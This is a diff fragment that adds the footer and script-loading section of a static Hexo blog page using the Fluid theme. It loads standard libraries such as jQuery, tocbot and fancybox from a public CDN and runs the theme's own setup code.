+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
